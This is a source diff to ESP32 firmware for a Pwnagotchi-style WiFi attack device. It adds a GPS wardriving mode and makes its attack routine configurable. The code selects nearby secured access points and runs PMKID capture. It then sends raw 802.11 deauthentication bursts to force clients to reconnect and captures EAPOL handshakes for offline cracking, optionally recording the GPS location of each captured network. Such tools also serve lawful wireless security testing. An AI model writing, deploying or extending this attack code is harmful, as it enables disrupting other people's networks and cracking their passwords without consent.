@@ -6,6 +6,7 @@
 #include "settings.h"
 #include "mood.h"
 #include "newPwnagotchi.h"
+#include "wardrive.h"
 
 // ==========================================
 // GLOBALS
@@ -64,10 +65,16 @@ static bool    hasMIC    = false;
 QueueHandle_t packetQueue    = nullptr;
 QueueHandle_t fileWriteQueue = nullptr;
 TaskHandle_t  pwnagotchiTaskHandle = nullptr;
-bool          pwnagotchiRunning    = false;
+TaskHandle_t  wardrivingTaskHandle = nullptr;
+volatile bool pwnagotchiRunning    = false;
+volatile bool wardrivingRunning    = false;
 
 std::vector<String> pwnedAPs;
 std::vector<String> failedClients;
+
+// Wardriving mode config
+static uint32_t wardrive_gps_timeout_ms = 5000;  // Default GPS timeout for wardriving task
+static unsigned long wardrive_scan_interval_ms = 30000; // Scan interval for wardriving
 
 // PCAP structures
 struct pcap_hdr_s {
@@ -561,19 +568,58 @@ bool n_pwnagotchi::begin() {
         return false;
     }
     logMessage("Pwnagotchi started.");
+    initNewPersonality();
+    return true;
+}
+
+bool n_pwnagotchi::beginWardriving(uint32_t gpsTimeoutMs) {
+    logMessage("Initializing Wardriving mode...");
+
+    // Store GPS timeout for wardriving task
+    if (gpsTimeoutMs > 0) {
+        wardrive_gps_timeout_ms = gpsTimeoutMs;
+    }
+
+    if (wifiResultsMutex == nullptr) {
+        wifiResultsMutex = xSemaphoreCreateMutex();
+        if (!wifiResultsMutex) { logMessage("Failed to create mutex!"); return false; }
+    }
+
+    // Start WiFi in promiscuous mode for scanning only (no attack)
+    esp_wifi_set_promiscuous_rx_cb(&wifiRTScanCallback);
+    esp_wifi_set_promiscuous(true);
+
+    wardrivingRunning = true;
+    BaseType_t r = xTaskCreatePinnedToCore(wardrivingTask, "WardrivingTask", 8192*2, 
+                                           (void*)gpsTimeoutMs, 1, &wardrivingTaskHandle, 1);
+    if (r != pdPASS) {
+        logMessage("Failed to create Wardriving task!");
+        wardrivingRunning = false;
+        esp_wifi_set_promiscuous(false);
+        return false;
+    }
+    logMessage("Wardriving mode started with " + String(gpsTimeoutMs) + "ms GPS timeout.");
+    initNewPersonality();
     return true;
 }
 
 bool n_pwnagotchi::end() {
-    logMessage("Stopping Pwnagotchi...");
+    logMessage("Stopping Pwnagotchi/Wardriving...");
 
-    // ── 1. Signal task to stop and delete it ─────────────────────────────────
+    // ── 1. Signal tasks to stop and delete them ───────────────────────────────
     pwnagotchiRunning = false;
+    wardrivingRunning = false;
 
     if (pwnagotchiTaskHandle != nullptr) {
         vTaskDelete(pwnagotchiTaskHandle);
         pwnagotchiTaskHandle = nullptr;
-        logMessage("[end] Task deleted.");
+        logMessage("[end] Pwnagotchi task deleted.");
+    }
+
+    if (wardrivingTaskHandle != nullptr) {
+        vTaskDelete(wardrivingTaskHandle);
+        wardrivingTaskHandle = nullptr;
+        logMessage("[end] Wardriving task deleted.");
     }
 
     // ── 2. Stop promiscuous mode ──────────────────────────────────────────────
@@ -684,8 +730,59 @@ bool n_pwnagotchi::end() {
         logMessage("[end] g_wifiRTResults cleared, mutex deleted.");
     }
 
-    logMessage("Pwnagotchi fully stopped and all memory released.");
+    logMessage("Pwnagotchi/Wardriving fully stopped and all memory released.");
     return true;
+}
+
+// ==========================================
+// WARDRIVING TASK
+// ==========================================
+
+void wardrivingTask(void *parameter) {
+    logMessage("Wardriving task started.");
+    uint32_t gpsTimeoutMs = (uint32_t)parameter != 0 ? (uint32_t)parameter : wardrive_gps_timeout_ms;
+    
+    while (wardrivingRunning) {
+        // Copy current WiFi results under mutex protection
+        if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
+            std::vector<wifiRTResults> localResults = g_wifiRTResults;
+            xSemaphoreGive(wifiResultsMutex);
+
+            // Convert wifiRTResults to wifiSpeedScan format for wardrive function
+            if (localResults.size() > 0) {
+                std::vector<wifiSpeedScan> networksToLog;
+                for (const auto &result : localResults) {
+                    wifiSpeedScan network = {
+                        result.ssid,
+                        result.rssi,
+                        result.channel,
+                        result.secure,
+                        {result.bssid[0], result.bssid[1], result.bssid[2], 
+                         result.bssid[3], result.bssid[4], result.bssid[5]}
+                    };
+                    networksToLog.push_back(network);
+                }
+
+                logMessage("Wardriving: found " + String(networksToLog.size()) + " networks.");
+                
+                // Call wardrive with GPS timeout per personality settings
+                uint32_t gpsTimeout = n_pwnagotchi_personality.gps_timeout_ms;
+                wardriveStatus wd = wardrive(networksToLog, gpsTimeout);
+                
+                if (wd.success && wd.gpsFixAcquired) {
+                    logMessage("Wardrive logged " + String(wd.networksLogged) + " networks @ " + 
+                              String(wd.latitude, 6) + "," + String(wd.longitude, 6));
+                } else {
+                    logMessage("Wardrive: GPS not acquired or failed");
+                }
+            }
+
+            vTaskDelay(wardrive_scan_interval_ms / portTICK_PERIOD_MS);
+        } else {
+            vTaskDelay(100 / portTICK_PERIOD_MS);
+        }
+    }
+    vTaskDelete(NULL);
 }
 
 // ==========================================
@@ -697,14 +794,9 @@ bool n_pwnagotchi::end() {
 
 void task(void *parameter) {
     auto whitelist = parseWhitelist();
+    setMoodLooking(0); // Start in looking mood
     while (pwnagotchiRunning) {
-        // Drain any pending file write requests first (BUG FIX: queue was never drained)
-        // {
-        //     FileWriteRequest *req = nullptr;
-        //     while (xQueueReceive(fileWriteQueue, &req, 0) == pdTRUE) {
-        //         if (req) handleFileWrite(req);
-        //     }
-        // }
+        setMoodLooking(0); // Ensure we're in looking mood while scanning
 
         if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
             std::vector<wifiRTResults> localResults = g_wifiRTResults;
@@ -716,7 +808,7 @@ void task(void *parameter) {
                     logMessage("Skipping " + network.ssid + " - whitelisted.");
                     continue;
                 }
-                ap = network;
+                ap = network;                
                 if (!networkStillExists(network.ssid, network.channel)) {
                     logMessage("Skipping " + network.ssid + " - no longer visible.");
                     continue;
@@ -750,6 +842,13 @@ void task(void *parameter) {
 void attackTask(void *parameter) {
     if (!ap.secure) return;
 
+    // Check RSSI threshold based on personality settings
+    if (ap.rssi < n_pwnagotchi_personality.rssi_threshold) {
+        logMessage("Network " + ap.ssid + " RSSI (" + String(ap.rssi) + ") below threshold (" + String(n_pwnagotchi_personality.rssi_threshold) + "), skipping.");
+        setMoodLooking(0); // Return to looking mood
+        return;
+    }
+
     for (const auto &s : pwnedAPs)     if (s == ap.ssid) return;
     // for (const auto &s : failedClients) {
     //     if (s == ap.ssid) {
@@ -763,24 +862,32 @@ void attackTask(void *parameter) {
     }
 
     logMessage("Attacking: " + ap.ssid);
+    setMoodApSelected(ap.ssid); 
 
     // --- Phase 1: PMKID ---
-    logMessage("PMKID attack on: " + ap.ssid);
-    if (runPMKIDAttack(ap.bssid, ap.channel)) {
-        logMessage("PMKID success: " + ap.ssid);
-        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
-            pwnedAPs.push_back(ap.ssid);
-        pwned_ap++;
-        sessionCaptures++;
-        
-        if (pwnagotchi.sound_on_events) {
-            delay(100); M5.Speaker.tone(1500,100);
-            delay(100); M5.Speaker.tone(2000,100);
-            delay(100); M5.Speaker.tone(2500,150); delay(150);
+    if (n_pwnagotchi_personality.enable_pmkid_attack) {
+        logMessage("PMKID attack on: " + ap.ssid);
+        setMoodToDeauth(ap.ssid); // Show deauth mood during PMKID
+        if (runPMKIDAttack(ap.bssid, ap.channel)) {
+            logMessage("PMKID success: " + ap.ssid);
+            if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
+                pwnedAPs.push_back(ap.ssid);
+            pwned_ap++;
+            sessionCaptures++;
+            
+            if (n_pwnagotchi_personality.sound_on_pmkid) {
+                delay(100); M5.Speaker.tone(1500,100);
+                delay(100); M5.Speaker.tone(2000,100);
+                delay(100); M5.Speaker.tone(2500,150); delay(150);
+            }
+            setMoodToNewHandshake(1);
+            lastPwnedAP = ap.ssid;
+            return;
         }
-        return;
+        logMessage("PMKID failed: " + ap.ssid);
+    } else {
+        logMessage("PMKID attack disabled, skipping PMKID phase for: " + ap.ssid);
     }
-    logMessage("PMKID failed: " + ap.ssid);
 
     // --- Phase 2: EAPOL handshake ---
     xSemaphoreTake(wifiMutex, portMAX_DELAY);
@@ -796,6 +903,7 @@ void attackTask(void *parameter) {
     }
 
     logMessage("EAPOL capture on: " + ap.ssid);
+    setMoodToDeauth(ap.ssid); // Continue deauth mood during EAPOL phase
     targetAPSet = true;
     memcpy(targetBSSID, ap.bssid, 6);
     for (int i = 0; i < 5; i++) eapolMsg[i] = false;
@@ -809,9 +917,9 @@ void attackTask(void *parameter) {
         0x00,0x00, 0x01,0x00
     };
 
-    // Send initial deauth burst
+    // Send initial deauth burst using personality settings
     uint16_t deauthCount = 0;
-    for (uint16_t i = 0; i < 120; i++) {
+    for (uint16_t i = 0; i < n_pwnagotchi_personality.deauth_packets_count; i++) {
         if ((i % 30) == 0 && i > 0) {
             if (!networkStillExists(ap.ssid, ap.channel)) {
                 logMessage("Network gone during deauth after " + String(deauthCount) + " pkts.");
@@ -821,14 +929,15 @@ void attackTask(void *parameter) {
         }
         xSemaphoreTake(wifiMutex, portMAX_DELAY);
         if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false) == ESP_OK)
-            deauthCount++;
+        deauthCount++;
         xSemaphoreGive(wifiMutex);
+        vTaskDelay(n_pwnagotchi_personality.deauth_packet_interval / portTICK_PERIOD_MS);
     }
     logMessage("Deauth sent: " + String(deauthCount) + " to " + ap.ssid);
 
     // Wait for handshake, keep sending deauth
     unsigned long startTime = millis();
-    const unsigned long EAPOL_TIMEOUT = 15000;
+    unsigned long EAPOL_TIMEOUT = n_pwnagotchi_personality.eapol_timeout;
 
     while (!isHandshakeComplete() && millis() - startTime < EAPOL_TIMEOUT) {
         if ((millis() - startTime) % 1000 < 100) {
@@ -847,9 +956,28 @@ void attackTask(void *parameter) {
 
     if (isHandshakeComplete()) {
         logMessage("Handshake captured for: " + ap.ssid + " in " + String(millis()-startTime) + "ms");
-        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
+        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end()){
             pwnedAPs.push_back(ap.ssid);
+        }
 
+        // Wardriving: log GPS location if enabled
+        if (n_pwnagotchi_personality.enable_wardriving) {
+            logMessage("Logging GPS location for: " + ap.ssid);
+            std::vector<wifiSpeedScan> currentNetwork;
+            currentNetwork.push_back({
+                ap.ssid,
+                ap.rssi,
+                ap.channel,
+                ap.secure,
+                {ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]}
+            });
+            wardriveStatus wd = wardrive(currentNetwork, n_pwnagotchi_personality.gps_timeout_ms);
+            if (wd.success && wd.gpsFixAcquired) {
+                logMessage("GPS logged: Lat=" + String(wd.latitude, 6) + " Lon=" + String(wd.longitude, 6) + " Alt=" + String(wd.altitude, 1));
+            } else {
+                logMessage("GPS logging failed or timeout");
+            }
+        }
         vTaskDelay(1000 / portTICK_PERIOD_MS);
         eapolCount = 0;
         for (int i = 0; i < 5; i++) eapolMsg[i] = false;
@@ -906,17 +1034,23 @@ void attackTask(void *parameter) {
         pwned_ap++;
         sessionCaptures++;
         
-        if (pwnagotchi.sound_on_events) {
+        if (n_pwnagotchi_personality.sound_on_handshake) {
             delay(100); M5.Speaker.tone(1500,100);
             delay(100); M5.Speaker.tone(2000,100);
             delay(100); M5.Speaker.tone(2500,150); delay(150);
         }
+        lastPwnedAP = ap.ssid;
+        setMoodToNewHandshake(1); // Happy mood for handshake success
         logMessage("File write queued for: " + ap.ssid);
     } else {
         logMessage("Handshake timeout for: " + ap.ssid);
         if (std::find(failedClients.begin(), failedClients.end(), ap.ssid) == failedClients.end())
             failedClients.push_back(ap.ssid);
+        setMoodToAttackFailed(ap.ssid); // Sad mood for attack failure
     }
+
+    // Delay before next attack per personality settings
+    vTaskDelay(n_pwnagotchi_personality.delay_between_attacks / portTICK_PERIOD_MS);
 
     // Reset state
     beaconDetected = false;
